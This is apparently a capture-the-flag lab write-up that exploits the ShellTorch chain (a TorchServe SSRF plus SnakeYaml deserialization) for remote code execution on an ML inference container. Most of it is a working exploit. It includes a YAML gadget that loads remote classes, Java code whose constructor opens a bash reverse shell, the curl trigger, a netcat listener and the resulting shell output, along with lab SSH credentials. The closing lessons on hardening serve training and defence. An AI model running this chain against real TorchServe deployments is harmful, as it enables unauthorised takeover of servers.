---
tags: [lab, attack/ai]
module: attacking_ai_applications_and_systems
last_updated: 2026-05-13
source_count: 1
---

# Model Deployment Tampering — ShellTorch RCE Lab Write-up

Exploit the ShellTorch vulnerability chain (CVE-2023-43654 + CVE-2022-1471) to achieve remote code execution on a TorchServe inference container via SSRF-triggered SnakeYaml deserialization.

## Target

| Field | Value |
|-------|-------|
| Environment | TorchServe ML inference server (containerized) |
| Access | SSH as `htb-stdnt` with given credentials |
| SSH credentials | `htb-stdnt` / `4c4demy_Studen7` |
| Difficulty | Medium |
| CVEs | CVE-2023-43654 (TorchServe SSRF), CVE-2022-1471 (SnakeYaml RCE) |

## Objective

> Exploit the ShellTorch vulnerability to obtain the flag.

## Background: Why Port Forwarding is Needed

TorchServe's management API (port 8081) is bound to localhost inside the target environment — it is not exposed on the external interface. To reach it from the attacker machine, we use **local port forwarding** (`-L`).

At the same time, the RCE payload needs to call back to the attacker machine. The target container cannot reach the attacker's public IP directly (NAT/firewall), so we use **remote port forwarding** (`-R`) to create listening ports on the target that tunnel back to the attacker:

| Port | Direction | Purpose |
|------|-----------|---------|
| `-L 8081:127.0.0.1:8081` | Local forward | Access TorchServe management API as `localhost:8081` on attacker |
| `-R 8000:127.0.0.1:8000` | Remote forward | Target fetches payload from `localhost:8000` → tunnels to attacker's Python HTTP server |
| `-R PWNPO:127.0.0.1:PWNPO` | Remote forward | Reverse shell from target connects to `localhost:PWNPO` → tunnels to attacker's netcat |

Choose any available local port for `PWNPO` (e.g., 9001).

## Step 1: Establish SSH Tunnel

```bash
ssh htb-stdnt@STMIP -p STMPO \
  -R 8000:127.0.0.1:8000 \
  -R 9001:127.0.0.1:9001 \
  -L 8081:127.0.0.1:8081 \
  -N
```

Leave this session running. All subsequent commands run in separate terminal tabs.

## Step 2: Prepare the Exploit Directory

```bash
mkdir work && cd work
pip3 install torch-workflow-archiver
```

`torch-workflow-archiver` is the official TorchServe tool for packaging model workflows into `.war` archives. We abuse it to package a malicious payload.

## Step 3: Create the SnakeYaml Gadget (spec.yaml)

TorchServe uses SnakeYaml to parse workflow spec files. SnakeYaml's `!!` type tag constructor allows instantiating arbitrary Java objects — including `URLClassLoader`, which loads remote Java classes and executes them:

```bash
echo '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/"]]]]' > spec.yaml
```

When TorchServe deserializes this YAML, it:
1. Instantiates `URLClassLoader` pointing to `http://127.0.0.1:8000/` (our Python HTTP server, tunneled via `-R 8000`)
2. Uses it to load a `javax.script.ScriptEngineFactory` service provider
3. Finds our factory class via the `META-INF/services/` service loader manifest
4. Instantiates our class, executing the constructor

## Step 4: Create the Minimal Handler

```bash
cat << EOF > handler.py
def initialize(self, context):
    self.model = self.load_model()
EOF
```

This stub satisfies `torch-workflow-archiver`'s requirement for a handler file.

## Step 5: Package the Malicious .war

```bash
torch-workflow-archiver --workflow-name student --spec-file spec.yaml --handler handler.py
```

This produces `student.war`.

## Step 6: Write the Java RCE Payload

Create `MyScriptEngineFactory.java`. The constructor runs when the class is instantiated during deserialization — this is where we embed our reverse shell. The payload uses `$@|bash` to handle special characters in the bash command:

```java
package exploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class MyScriptEngineFactory implements ScriptEngineFactory {

    public MyScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec(
                "bash -c $@|bash 0 echo bash -i >& /dev/tcp/127.0.0.1/9001 0>&1"
            );
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override public String getEngineName()       { return null; }
    @Override public String getEngineVersion()    { return null; }
    @Override public List<String> getExtensions() { return null; }
    @Override public List<String> getMimeTypes()  { return null; }
    @Override public List<String> getNames()      { return null; }
    @Override public String getLanguageName()     { return null; }
    @Override public String getLanguageVersion()  { return null; }
    @Override public Object getParameter(String key) { return null; }
    @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
    @Override public String getOutputStatement(String toDisplay) { return null; }
    @Override public String getProgram(String... statements) { return null; }
    @Override public ScriptEngine getScriptEngine() { return null; }
}
```

Replace `9001` with your chosen `PWNPO` value.

## Step 7: Compile and Set Up the Service Loader Structure

Java's `ServiceLoader` mechanism requires the class to be registered in `META-INF/services/` under the interface name:

```bash
javac MyScriptEngineFactory.java

mkdir -p META-INF/services
mkdir exploit

echo 'exploit.MyScriptEngineFactory' > META-INF/services/javax.script.ScriptEngineFactory
mv MyScriptEngineFactory.class exploit/
```

The directory structure in `work/`:

```
work/
├── student.war
├── spec.yaml
├── handler.py
├── exploit/
│   └── MyScriptEngineFactory.class
└── META-INF/
    └── services/
        └── javax.script.ScriptEngineFactory
```

## Step 8: Start Python HTTP Server and Netcat Listener

In two separate terminal tabs:

```bash
# Tab 1 — serve the payload (the .war file and Java class)
cd work && python3 -m http.server 8000
```

```bash
# Tab 2 — catch the reverse shell
nc -nvlp 9001
```

## Step 9: Trigger the SSRF → RCE Chain

```bash
curl -X POST http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/student.war
```

**What happens:**
1. TorchServe's management API receives the POST with no authentication
2. The `?url=` parameter is fetched without validation (CVE-2023-43654 SSRF) — it fetches `student.war` from our Python HTTP server (via the `-R 8000` tunnel)
3. TorchServe extracts and parses `spec.yaml` with SnakeYaml
4. SnakeYaml deserializes the `!!javax.script.ScriptEngineManager` gadget chain (CVE-2022-1471)
5. `URLClassLoader` fetches `exploit/MyScriptEngineFactory.class` from port 8000
6. Instantiating the class triggers the constructor, which spawns `bash -i` with a reverse shell to port 9001 (via the `-R 9001` tunnel)

The curl response will show a `ClassCastException` error — this is expected and confirms the chain fired. Check your netcat listener:

```
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 46966
bash: cannot set terminal process group (8): Not a tty
bash: no job control in this shell
ng-8414-aiappsystemmdt-serri-8448b6b595-gbw66:/#
```

## Step 10: Get the Flag

```bash
ls /
cat /flag_3dd14dcdd.txt
```

The flag file has a randomized suffix — use `ls /` to find the exact filename.

## Exploit Chain Summary

```
Attacker SSH tunnel → TorchServe mgmt API (8081, no auth)
  → POST /workflows?url=http://127.0.0.1:8000/student.war   [CVE-2023-43654 SSRF]
    → TorchServe fetches + parses spec.yaml with SnakeYaml
      → !!ScriptEngineManager gadget loads URLClassLoader      [CVE-2022-1471 deserialization]
        → URLClassLoader fetches MyScriptEngineFactory.class from attacker
          → Constructor executes: bash reverse shell → attacker's netcat
```

## Lessons Learned

- **Management APIs bound to localhost still need authentication.** An attacker with any foothold (SSH access, SSRF from another service) can reach localhost-only APIs. Require auth regardless.
- **`?url=` parameters that trigger fetches are SSRF vectors.** Any endpoint that fetches a URL on behalf of the server must validate the URL against an allowlist. Reject `localhost`, RFC-1918 ranges, and arbitrary external domains.
- **SnakeYaml's `!!` constructor deserialization should be disabled in production.** Use `SafeConstructor` or a schema that rejects type tags.
- **Port forwarding as a tunnel:** When a lab requires reaching internal ports, `-L` (local forward) makes remote services accessible locally; `-R` (remote forward) makes local services accessible on the remote host.

## Related Pages

- [[attack/ai/vulnerable_ai_systems]] — ShellTorch chain theory and CVE reference
- [[attack/ai/attacking_ai_systems]] — hub page for AI application and system attacks

## Sources

- raw/lab/attacking_ai_applications_and_systems/model_deployment_tampering.md
